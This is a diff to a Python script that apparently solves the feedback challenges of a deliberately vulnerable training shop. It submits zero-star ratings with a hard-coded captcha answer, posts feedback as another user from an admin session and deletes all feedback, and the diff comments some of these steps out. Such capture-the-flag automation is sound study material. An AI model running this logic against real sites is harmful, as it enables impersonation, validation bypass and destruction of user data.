@@ -23,7 +23,7 @@ def delete_all_feedback(server, session):
     :param session: Session
     """
     feedback = get_feedback_list(server, session)
-    print('Deleting all feedback...'),
+    print('Deleting all feedback...', end=""),
     for entry in feedback:
         d = session.delete('{}/api/Feedbacks/{}'.format(server, entry.get('id')))
         if not d.ok:
@@ -41,13 +41,15 @@ def send_feedback(server, session, payload):
     submit = session.post('{}/api/Feedbacks'.format(server),
                           headers={'Content-type': 'application/json'},
                           data=json.dumps(payload))
-    if not submit.ok:
-        raise RuntimeError('Error submitting feedback.')
+    
+    print(submit)
+    # if not submit.ok:
+    #     raise RuntimeError('Error submitting feedback.')
 
 
 def submit_zero_star_feedback(server, session):
-    print('Submitting zero star feedback...'),
-    payload = {'comment': 'welp', 'rating': 0}
+    print('Submitting zero star feedback...', end=""),
+    payload = {'captchaId': 0, 'captcha': 73,'comment':'ttt (anonymous)','rating': 0}
     send_feedback(server, session, payload)
     print('Success.')
 
@@ -67,7 +69,7 @@ def inform_shop_of_problem_libraries(server, session):
 
 
 def submit_feedback_as_another_user(server):
-    print('Submitting feedback from admin account as userid 2...'),
+    print('Submitting feedback from admin account as userid 2...', end=""),
     session = get_admin_session(server)
     payload = {'comment': 'nyah nyah', 'UserId': 2}
     send_feedback(server, session, payload)
@@ -78,8 +80,8 @@ def solve_feedback_challenges(server):
     print('\n== FEEDBACK CHALLENGES ==\n')
     session = get_admin_session(server)
     submit_zero_star_feedback(server, session)
-    submit_xss4_feedback(server, session)
+    #submit_xss4_feedback(server, session)
     inform_shop_of_problem_libraries(server, session)
-    submit_feedback_as_another_user(server)
-    delete_all_feedback(server, session)
+    ##submit_feedback_as_another_user(server)
+    ##delete_all_feedback(server, session)
     print('\n== FEEDBACK CHALLENGES COMPLETE ==\n')
